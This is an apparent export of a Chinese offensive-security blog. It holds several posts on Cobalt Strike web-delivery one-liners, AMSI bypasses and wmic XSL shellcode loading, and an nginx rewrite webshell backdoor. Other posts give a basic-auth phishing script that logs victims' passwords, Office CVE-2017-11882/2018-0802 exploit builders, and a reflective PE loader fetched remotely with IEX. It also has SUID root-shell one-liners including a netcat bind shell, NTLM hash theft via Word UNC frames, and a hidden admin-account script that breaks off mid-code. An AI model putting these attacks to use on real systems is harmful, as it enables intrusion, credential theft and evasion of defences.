\".exe&amp;%APPDATA%\\\\\" + f + \".exe&amp;del %APPDATA%\\\\\" + f + \".exe\";&#125;" + "if (\"powershell\".equals($2)) &#123;" + "return PowerShellOneLiner($1);&#125;" + "if (\"python\".equals($2)) &#123;" + "return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";&#125;" + "if (\"regsvr32\".equals($2)) &#123;" + "return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";&#125;" + "if (\"mshta\".equals($2)) &#123;" + "return \"mshta \" + $1;&#125;" + "if (\"wmic\".equals($2)) &#123;" + " return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";&#125;" + "print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");" + "throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");&#125;"); //修改以后输出目录 cClass.writeFile("/tmp/"); System.out.println("=======修改方法完========="); &#125; catch (NotFoundException e) &#123; e.printStackTrace(); &#125; catch (CannotCompileException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在这里要注意的是，方法 OneLiner(String url, String type)有两个参数，方法中的参数从 $1 开始，若该方法为非 static 方法，可以用 $0 来表示该方法实例自身，若该方法为 static 方法，则 $0 不可用。而且写的代码需要将&quot;, \ 进行转义。 运行此代码，可成功生成一个新的class: 将此class替换CS中的class就好了。 使用的时候只需要在aggressor中site_host中指定即可，例如使用wmic1site_host(%options["host"], %options["port"], %options["uri"], $data, "text/plain", "Scripted Web Delivery (wmic)"); 使用mshta1site_host(%options["host"], %options["port"], %options["htauri"], $htadata, "application/hta", "Scripted Web Delivery (mshta)"); 效果如下： 已经编译好的class可以从这里下载： GIT : CS_Chinese_support]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DotNetToJScript 复活之路]]></title>
    <url>%2Farchives%2FAMSI_bypass.html</url>
    <content type="text"><![CDATA[0x00 简介去年James Forshaw开源了一个工具DotNetToJScript，能够利用JS、Vbs等脚本加载.Net程序。再此工具发布以后，很多很多的工具也在此基础上产生，比如StarFighters、CACTUSTORCH、SharpShooter等等，基于脚本的攻击也随之越来越多，所以在win10中，微软引入了AMSI，并将基于DotNetToJScript的脚本特征加入到检测之列。并将此工具标记为恶意软件。如果直接运行通过DotNetToJScript生成的脚本，便会直接拦截，如下图最近，学到了两种bypass的方式，所以进行一下分享。 0x01 禁用AMSI这里讲的禁用AMSI并不需要高权限，只需要一个简单的Trick,这个是从这篇文章学来的，通过Process Monitor 进行查看，设置以下过滤器：运行通过DotNetToJScript生成的脚本，可以监控到以下调用过程：这里我们可以看到，在加载AMSI之前，查询了以下注册表键值HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable,尝试修改此键值为0：再次运行脚本，可以看到shellcode成功执行了，如下图：虽然修改注册表可以实现禁用AMSI，但是需要高权限，那怎样才可以在普通权限下禁用AMSI，其实通过@tiraniddo的文章我们可以看到，其实可以通过DLL劫持来进行绕过。通过Process Monitor可以看到检测过程中调用了C:\Windows\System32\amsi.dll,如果我们把cscript.exe 重命名成amsi.dll会怎么样呢？12copy c:\windows\system32\cscript.exe amsi.dllamsi.dll evil.js 可以看到成功shellcode 成功执行了，修改过滤器如下：我们来看一下调用过程可以看到，现在已经没有调用C:\Windows\System32\amsi.dll,这也就让我们成功执行了我们的shellcode。 0x02 利用wmicCasey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。经过测试，通过此方式来调用DotNetToJScript的脚本也是可以成功执行的。subTee的文章在这。利用命令如下：1234#Local Filewmic process list /FORMAT:evil.xsl#Remote Filewmic os get /FORMAT:"https://example.com/evil.xsl" evil.xsl1234567891011&lt;?xml version='1.0'?&gt;&lt;stylesheetxmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"xmlns:user="placeholder"version="1.0"&gt;&lt;output method="text"/&gt; &lt;ms:script implements-prefix="user" language="JScript"&gt; &lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe"); ]]&gt; &lt;/ms:script&gt;&lt;/stylesheet&gt; 修改好的脚本，可以看这里：戳我使用一下命令则可执行shellcode1wmic os get /FORMAT:"https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl" 但是使用wmic执行的时候会有一个问题，在powershell下执行会失败。如下图： 那么怎么调用呢？在读了mdsec的这篇文章以后，我们发现，其实是可以通过COM来调用的。用javascript写可以这样：123456var xml = new ActiveXObject("Microsoft.XMLDOM");xml.async = false;var xsl = xml;xsl.load("http://host/a.xsl");xml.transformNode(xsl);self.close(); GIT : AMSI_bypass 使用如下图： 0x03参考https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.htmlhttps://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用hashcat破解加密office文件]]></title>
    <url>%2Farchives%2Fhashcat_crack_office.html</url>
    <content type="text"><![CDATA[首先要下载 office2john.py，支持破解的加密为office自带的加密功能，即：使用office2john将office转换为hash：1python office2john.py 123.docx &gt; hash.txt 使用以下命令进行切割，转换成hashcat支持的形式：1awk -F ":" '&#123;print $2&#125;' hash.txt &gt; hashhc.txt 使用hashcat进行破解：1hashcat -m 9500 hashhc.txt ~/wordlist/passwd.txt -o out.txt 这里我使用了office2010，所以选择9500，要根据对应版本来选择 选择版本可以使用 hashcat –help 来查看破解成功如下：]]></content>
  </entry>
  <entry>
    <title><![CDATA[Cobalt strike3.8 中文支持(Update)]]></title>
    <url>%2Farchives%2FCS3_8_chinese_support.html</url>
    <content type="text"><![CDATA[0x00 简介cobaltstrike3.10 已经出来很久了，其中最吸引人的可能就是他已经支持中文了，但是貌似很久以来都没在网上看到3.10的资源，所以就没办法，拿手上的3.8 改改将就用。 0x01 反编译首先我们要对cobaltstrike3.8进行反编译，这里可以参照之前破解的方法，戳我,使用jad进行反编译。 0x02 修改代码要怎么定位到要改哪里呢？我们可以看一下CS的输出： 可以看到在输出之前有received output,所以我们就可以检索这个关键字，马上可以定位到BeaconC2.class文件，搜索“received output”一共有5个结果： 查看代码如下： 可以看到，输出的结果是由CommonUtils类的bString方法返回的，定位到CommonUtils.class文件查看代码： 可以看到传过来的数据使用 ISO8859-1 进行了编码。ISO8859-1属于单字节编码，最多能表示的字符范围是0-255，应用于英文系列。比如，字母a的编码为0x61=97。 很明显， ISO8859-1 编码表示的字符范围很窄，无法表示中文字符。这就是CS无法显示中文的原因。经过测试，使用 ISO8859-1 进行中间编码是不会导致数据丢失的。那么我们是不是可以修改代码把编码转过来来呢？当然可以 ！ 但是由于自己比较菜，直接修改CommonUtils.java以后编译不过去（表示很难受，如果你会编译，还希望不吝赐教）。所以只能去修改BeaconC2.java。 经过多次测试，发现在CS上执行命令以后返回的结果编码为GBK，所以转码过程为CommonUtils.java转码：1GBK -&gt; ISO8859-1 我们要修改的BeaconC2.1ISO8859-1 -&gt; GBK -&gt; UTF-8 所以思路就很明朗了，我们只需要在传入rest之前把中文转换成UTF-8就可以了，代码也很简单，测试如下： 所以关键代码为：123String tmp = CommonUtils.bString(CommonUtils.readAll(in));String tmp1 = new String(tmp.getBytes("ISO8859-1"),"gbk");String rest = new String(tmp1.getBytes(),"utf-8"); 源代码是这样： 修改以后是这样： 所以找到所有的:1String rest = CommonUtils.bString(CommonUtils.readAll(in)); 替换即可。 0x03 编译替换修改以后，需要把BeaconC2.java编译之后替换原来的BeaconC2.class。编译方法很简单，只需要把BeaconC2.java放到解压以后的CS目录，执行以下命令：1javac -classpath . BeaconC2.java -Xlint:unchecked 在这里，可能会碰到以下报错 这里可以改一下代码，将12import c2profile.MalleableHook.MyHook;import dns.DNSServer.Handler; 改为：12import c2profile.MalleableHook;import dns.DNSServer; 在进行编译即可。之后将原来的BeaconC2.class替换，我们的CS就修改完成了。 0x04 效果这里录了一个DEMO: 0x05 纠错经过小伙伴的反馈以及我自己的测试，发现这么粗暴的改是有问题的，如果把所有输出的编码都改了，会使得程序流程走不通，部分功能不能使用，所以还是要针对性的修改。也就是在BeaconC2.class 中修改想要的输出部分，首先，检索received output, 把其对应的1String rest = CommonUtils.bString(CommonUtils.readAll(in)); 替换，之后经过测试 type == 22 是回显文件列表的，所以我们只需要修改这部分就好了。如下图： 这样就不会造成程序其他功能上的错误了。关于上传，下载，执行等，都写在TaskBeacon.class 里面，可以针对性对其编码进行修改。这里就不详细说明了，有兴趣的可以自己去读一下代码，关于文件浏览，我们可以定位到aggressor/windows/FileBrowser.class,其双击事件代码如下： 调用了ls 方法： ls 方法调用了 beacons.task_ls,快速定位到server/Beacons.class, 由于双击事件是取得返回转码以后的文字，所以要让功能正常使用，我们需要再将编码转回去，修改如下： 这样就可以正常使用文件浏览功能了，以上替换的class文件已经推到了github，欢迎小伙伴一起来修改bug~ GIT : CS_Chinese_support]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack with rewrite]]></title>
    <url>%2Farchives%2Fhack_with_rewrite.html</url>
    <content type="text"><![CDATA[0x00 简介大家都知道apache，nginx等有rewrite的功能，通过rewrite规则可以把输入的URL转换成另一个URL，这是我们常见的一种需求，可以让我们的url变得更加简洁。但是其实这个功能也可被用于一些别的目的。下面就简单的介绍一下。 0x01 后门关于通过配置文件做后门已经有很多文章有了介绍，即.htaccess和.user.ini文件构造后门，关于.htaccess后门可以看这里,user.ini后门P牛也发过一篇文章，可以看这里,当然还有柠檬师傅的php.ini构成的后门。那么跟rewrite有什么关系呢。其实rewrite主要是为了逃避日志审查，通过rewrite，我们可以通过访问一个图片后缀的文件来执行我们的webshell，但是修改这些配置文件需要一定的权限。下面来进行一下简单的介绍。测试的时候主要是使用nginx,所以对nginx进行一下介绍，关于apache的配置有兴趣可以自己去查一波。下面是我的配置：ngingx.conf1234567891011121314151617181920212223worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; include /usr/local/nginx/vhosts/*.conf; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; 配置了多个域名的配置，所以针对某个域名的配置文件在vhosts里面，要配置的域名的配置文件：mydomain.conf12345678910111213141516171819202122232425262728293031server &#123; listen 80; server_name mydomain.com; root /www/mydomain; index index.html index.php; if ( $query_string ~* ".*[\;'\&lt;\&gt;].*" )&#123; return 404; &#125; location ~ .*\.(gif|jpg|jpeg|bmp|png|swf|flv|ico)$ &#123; expires 30d; &#125; location ~ .*\.(js|css)?$ &#123; expires 7d; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; #设置PATH_INFO并改写SCRIPT_FILENAME,SCRIPT_NAME服务器环境变量 set $fastcgi_script_name2 $fastcgi_script_name; if ($fastcgi_script_name ~ "^(.+\.php)(/.+)$") &#123; set $fastcgi_script_name2 $1; set $path_info $2; &#125; fastcgi_param PATH_INFO $path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name2; fastcgi_param SCRIPT_NAME $fastcgi_script_name2; &#125;&#125; 要配置重定向很简单，只需要加入123location ~ \.png$ &#123;rewrite ^/img/test\.png$ /img/test.php last;&#125; 意思是匹配以png结尾的url，如果匹配到 img/test.png，则重定向到 img/test.php，所以，只需要在img目录下存放test.php，我们就可以通过访问 http://domain.com/img/test.png来访问。如下图: 关于更多匹配的规则，可以看这篇文章。 配置完需要重启nginx服务。 0x02 基础认证钓鱼关于基础认证钓鱼，其实很早之前就已经有文章介绍过了，比如如何制作基础认证钓鱼页面。其实原理就是在页面中插入一个php的img，即:1&lt;img src="http://site.com/1.php"alt="Could not load image - Invalid credentils."/&gt;&gt; php的代码就是401的验证，当用户打开这个页面的时候，由于请求了http://site.com/1.php，所以会弹出验证的页面，用户输入账号密码之后，密码则会被攻击者记录。 注：这种方法适用于Firefox和IE浏览器，Chrome并不会弹出基础认证窗口。 为了让此攻击达到更好地隐蔽效果，我们可以使用rewrite来重写url。则使得访问的链接文件后缀为一个图片。为了达到更好地攻击效果，写了以下php代码：1234567891011121314151617181920&lt;?php$now = new DateTime();$user = isset($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : "";$pass = isset($_SERVER['PHP_AUTH_PW']) ? $_SERVER['PHP_AUTH_PW'] : "";if ($user &amp;&amp; $pass)&#123; $fp = fopen("count.txt", "a"); $content = fread($fp); $ip = $_SERVER["REMOTE_ADDR"]; $all = file_get_contents("count.txt"); fwrite($fp, $now-&gt;format("Y-m-d H:i:s") . "\t" . $ip . "\t" . $user . ":" . $pass . "\n"); $line = substr_count($all,$ip); fclose($fp);&#125;if($line &lt; 2)&#123; header('WWW-Authenticate: Basic realm="Corporate domain"');&#125;else&#123; header('content-type: image/png'); echo file_get_contents("test.png");&#125;?&gt; 代码的功能就是弹出认证窗口，等待用户输入，并将输入的账号密码存到count.txt，如果此用户输入已达3次（一次输入可能是随便输入的账号密码），则输出正常图片。演示如下： 当然，你可以自己定义其他功能，比如将账号密码发送到邮箱等等。 php代码写好了，怎么利用呢？其实我们要做到就是找各种编辑器，找那种可以远程插入图片的，然后插入我们的链接，如果网站直接把链接插入网站，那么在加载的时候，就会加载我们的验证页面。rewrite除了可以让后缀看起来是一个图片文件，其实还可以对一些编辑器进行绕过，比如插入远程图片的时候，编辑器对图片进行预览: 碰到这种情况，我们可以首先使用默认配置的nginx插入图片，如下图： 插入成功并提交以后，再重新修改rewrite。这样可以进行一些绕过。某种情景的攻击如下：demo: 为了达到更好地效果。攻击者可以注册一个看起来受信任的域名。比如说，如果攻击者的目标是targetdomain.com，那么他就可以注册如下的类似地址：1234567targetdomain.cotargetdomain.nettarget-domain.comtargetdomain-oauth.comtargetdomain-cdn.comtargetdomain-images.comlogin-targetdomain.com]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-0802利用]]></title>
    <url>%2Farchives%2FCVE_2018_0802.html</url>
    <content type="text"><![CDATA[在CVE-2017-11882之后，2018年1月份又出了一个新的“噩梦公式二代”，在野样本嵌入了利用Nday漏洞和0day漏洞的2个公式对象同时进行攻击，Nday漏洞可以攻击未打补丁的系统，0day漏洞则攻击全补丁系统，绕过了CVE-2017-11882补丁的ASLR（地址随机化）安全保护措施，攻击最终将在用户电脑中植入恶意的远程控制程序。关于此漏洞的分析，可以看这里，今天看到在github公开了一个CVE-2018-0802的利用脚本，地址在这，为了达到最完美的利用，所以编写了RTF_11882_0802。 GIT：RTF_11882_0802 此脚本集合了两个公式利用漏洞。 利用方式与之前的方式一样。1python RTF_11882_0802.py -c "cmd.exe /c calc.exe" -i test.rtf -o test.doc 其实就是简单粗暴的把两个公式编辑器插入文档中，一个是11882，一个是0802。 “噩梦公式二代”（CVE-2018-0802）所使用的0day漏洞堪称CVE-2017-11882的双胞胎漏洞，攻击样本中的一个漏洞针对未打补丁前的系统，另外一个漏洞针对打补丁后的系统，利用两个OLE同时进行攻击，黑客精心构造的攻击完美兼容了系统漏洞补丁环境的不同情况。这个漏洞的利用技巧和Bypass ASLR的方式都带有一定的巧合性，假如EQNEDT32.EXE模块内没有一条满足条件的ret指令可以用来绕过ASLR，假如lpLogFont不是sub_21774的第一个参数，假如CVE-2017-11882的补丁修复方式强制开启了DEP保护，“噩梦公式二代”将没有可乘之机。 解决方案一、及时更新补丁 补丁下载地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802 二、通过注册表禁用此模块，可通过修改注册表，禁用以下COM控件的方式进行缓解，其中XX.X为版本号 在运行中输入：1reg add “HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;” /v”Compatibility Flags” /t REG_DWORD /d 0×400 1reg add”HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;” /v”Compatibility Flags” /t REG_DWORD /d 0×400 注：此脚本只是为了安全研究，切勿非法使用！使用此脚本所造成的一切法律问题及后果，本站概不负责！]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BypassAV With ReflectivePEInjection]]></title>
    <url>%2Farchives%2FBypassAV_With_ReflectivePEInjection.html</url>
    <content type="text"><![CDATA[有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" 获取exp的字节流，之后再在内存中加载exp，所以思路也很简单，我们只需要把需要的exp转换成字符串，写入脚本，就可以构造一个powershell脚本。 这里整理了一个脚本方便转换：123456789101112131415161718function Convert-BinaryToString &#123; [CmdletBinding()] param ( [string] $FilePath ) try &#123; $ByteArray = [System.IO.File]::ReadAllBytes($FilePath); &#125; catch &#123; throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct."; &#125; if ($ByteArray) &#123; $Base64String = [System.Convert]::ToBase64String($ByteArray); &#125; else &#123; throw '$ByteArray is $null.'; &#125; $Base64String | set-content ("b64.txt")&#125; 使用zcgonvh的16032做演示。使用脚本转换：12PS C:\Users\evi1cg\Desktop\16_032&gt; . .\Convert-BinaryToString.ps1PS C:\Users\evi1cg\Desktop\16_032&gt; Convert-BinaryToString -FilePath .\ms16-032_x64.exe 生成base64的字符串并存储在b64.txt中。 使用如下命令进行转换：12$InputString = "base64string"$PEBytes = [System.Convert]::FromBase64String($InputString) 之后就可以使用1Invoke-ReflectivePEInjection -PEBytes $PEBytes 进行加载，最后分享一下最终的脚本： E2P_MS16-032.ps1 使用方式为：1E2P_MS16-032 -Command '"net user"' 脚本GIT：Pentest。 远程加载命令：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"whoami\"'"]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>bypassav</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUID Privilege Escalation]]></title>
    <url>%2Farchives%2FSUID_Privilege_Escalation.html</url>
    <content type="text"><![CDATA[Linux提权中，可以用的SUID文件来提权，SUID的作用就是：让本来没有相应权限的用户运行这个程序时，可以访问没有权限访问的资源。通常可以使用一下命令来找有SUID标志位的文件：123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 例如nmap12ls -l /usr/bin/nmap-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap 存在s 则表示其存在SUID标志位，并拥有root的执行权限。以下是几类可用于提权的文件总结： 1.Nmap老版本的nmap（2.02-5.21）有 interactive，是允许用户执行系统命令的。提权方式1nmap --interactive 之后执行命令：123nmap&gt; !shsh-3.2# whoamiroot msf中的模块为：1exploit/unix/local/setuid_nmap 2.Find12touch testfind test -exec whoami \; 如果服务器上装了nc，可以直接使用以下命令进行监听：1find test -exec netcat -lvp 5555 -e /bin/sh \; 之后进行连接：1netcat 192.168.1.100 5555 则可获取root shell 3.vim/vi打开vim,按下ESC12:set shell=/bin/sh:shell 则可执行命令 4.bash123bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 5.less12less /etc/passwd!/bin/sh 6.more12more /home/pelle/myfile!/bin/bash 7.cp使用cp覆盖 /etc/shadow 8.mv使用mv 覆盖 /etc/shadow 或者/etc/sudoers 9.awk1awk 'BEGIN &#123;system("/bin/bash")&#125;' 10.man12man passwd!/bin/bash 11.python/perl/ruby/lua/etcperl1exec "/bin/bash"; python12import osos.system("/bin/bash") 12.tcpdump123echo $'id\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 欢迎补充。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>Privilege Escalation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过Microsoft Office 窃取 NTLM Hashes]]></title>
    <url>%2Farchives%2FGet_NTLM_Hashes.html</url>
    <content type="text"><![CDATA[之前有人总结了很多种窃取NTLM hash的方法，原文,译文。里面写的方法已经很多了，最近从这里又学到了一个新的方法，所以在这里进行一下分享，也算是一个补充。 历史上，Microsoft Word被用作HTML编辑器。这意味着它可以支持HTML元素，例如框架集。因此，可以将Microsoft Word文档与UNC路径链接起来，并将其与响应程序结合，以便从外部捕获NTLM哈希值。带有docx扩展名的Word文档实际上是一个包含各种XML文档的zip文件。这些XML文件正在控制主题，字体，文档的设置和Web设置。 所以我们可以新建一个任意文档，并用压缩包来打开他。 在word 目录下有一个webSettings.xml。我们对这个文件进行修改，添加以下代码则会创建与另外一个文件的链接。1234567891011121314&lt;w:frameset&gt;&lt;w:framesetSplitbar&gt;&lt;w:w w:val="60"/&gt;&lt;w:color w:val="auto"/&gt;&lt;w:noBorder/&gt;&lt;/w:framesetSplitbar&gt;&lt;w:frameset&gt;&lt;w:frame&gt;&lt;w:name w:val="3"/&gt;&lt;w:sourceFileName r:id="rId1"/&gt;&lt;w:linkedToFile/&gt;&lt;/w:frame&gt;&lt;/w:frameset&gt;&lt;/w:frameset&gt; 最终修改后的webSettings.xml如下：1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;w:webSettings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" mc:Ignorable="w14"&gt; &lt;w:frameset&gt;&lt;w:framesetSplitbar&gt;&lt;w:w w:val="60"/&gt;&lt;w:color w:val="auto"/&gt;&lt;w:noBorder/&gt;&lt;/w:framesetSplitbar&gt;&lt;w:frameset&gt;&lt;w:frame&gt;&lt;w:name w:val="3"/&gt;&lt;w:sourceFileName r:id="rId1"/&gt;&lt;w:linkedToFile/&gt;&lt;/w:frame&gt;&lt;/w:frameset&gt;&lt;/w:frameset&gt;&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;&lt;/w:webSettings&gt; 现在我们把新的webSettings.xml替换原来的webSettings.xml，之后在word目录下的_rels目录创建一个新的文件 webSettings.xml.rels，文件内容如下：12345&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;Relationshipsxmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\172.16.103.130\Updates.docx" TargetMode="External"/&gt;&lt;/Relationships&gt; 在这里包含了UNC路径。指向我们的Responder。 之后把文档重新命名为docx。开启Responder1python Responder.py -I eth0 -wrf 打开word，则可获取到hash 当然，使用DDE的方式以及CVE-2017-0199等其他的方式都是可以的。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>gethash</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-11882利用]]></title>
    <url>%2Farchives%2FCVE_2017_11882_exp.html</url>
    <content type="text"><![CDATA[最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882）。 今天在twitter上看到有人共享了一个POC，twitter地址，poc地址，后来又看到有人共享了一个项目CVE-2017-11882，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，使用起来可能并不容易，所以就对此文件进行了简单的修改，具体项目地址如下：GIT：CVE-2017-11882 。使用方式很简单，如果要执行命令1python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc demo 关于怎么进一步利用，可以参考之前写的《windows命令执行漏洞不会玩？ 看我！》，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：1python Command_CVE-2017-11882.py -c "mshta http://site.com/abc" -o test.doc 最终效果如下： 解决方案： 1、微软已经对此漏洞做出了修复。123(1)下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882 更新补丁进行修补(2)开启Windows Update功能，定期对系统进行自动更新 2、由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。 按下Win+R组合键，打开cmd.exe 对应office版本修改以下注册表路径以后，输入：123reg add "HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;" /v "Compatibility Flags" /t REG_DWORD /d 0x400reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;" /v "Compatibility Flags" /t REG_DWORD /d 0x400]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你能找到我么？-- 隐藏用户建立（Powershell）]]></title>
    <url>%2Farchives%2FUserClone.html</url>
    <content type="text"><![CDATA[最近做测试的时候发现，windows server2012 使用Mimikatz是直接抓不到明文密码的，而且，直接创建的账号登陆有时会碰到这个问题： ps：2012抓明文需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，才能记录到明文密码。 后来发现以前的建立克隆账号的方式是可以使得新建的账号登陆系统的，为了方便，整理了一个powershell脚本，脚本可以自动修改注册表键值权限（需要用administrator权限运行，即bypassuac以后的权限），之后在进行操作。具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147function Create-Clone&#123;&lt;#.SYNOPSISThis script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user..PARAMETER uThe clone username.PARAMETER pThe clone user's password.PARAMETER cuThe user to clone, default administrator .EXAMPLECreate-Clone -u evi1cg -p evi1cg123 -cu administrator#&gt; Param( [Parameter(Mandatory=$true)] [String] $u, [Parameter(Mandatory=$true)] [String] $p, [Parameter(Mandatory=$false)] [String] $cu = "administrator" ) function upReg&#123; "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]" | Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "| Out-File -Append $env:temp\up.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"| Out-File -Append $env:temp\up.ini cmd /c "regini $env:temp\up.ini" Remove-Item $env:temp\up.ini &#125; function downreg &#123; "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM [17]"| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]" | Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "| Out-File -Append $env:temp\down.ini "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"| Out-File -Append $env:temp\down.ini cmd /c "regini $env:temp\down.ini" Remove-Item $env:temp\down.ini &#125; function Create-user ([string]$Username,[string]$Password) &#123; $group = "Administrators" $existing = Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$Username" if (!$existing) &#123; Write-Host "[*] Creating new local user $Username with password $Password" &amp; NET USER $Username $Password /add /y /expires:never | Out-Null Write-Host "[*] Adding local user $Username to $group." &amp; NET LOCALGROUP $group $Username /add | Out-Null &#125; else &#123; Write-Host "[*] Adding existing user $Username to $group." &amp; NET LOCALGROUP $group $Username /add | Out-Null $adsi = [ADSI]"WinNT://$env:COMPUTERNAME" $exist = $adsi.Children | where &#123;$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username &#125; Write-Host "[*] Setting password for existing local user $Username" $exist.SetPassword($Password) &#125; Write-Host "[*] Ensuring password for $Username never expires." &amp; WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE | Out-Null &#125; function GetUser-Key([string]$user) &#123; 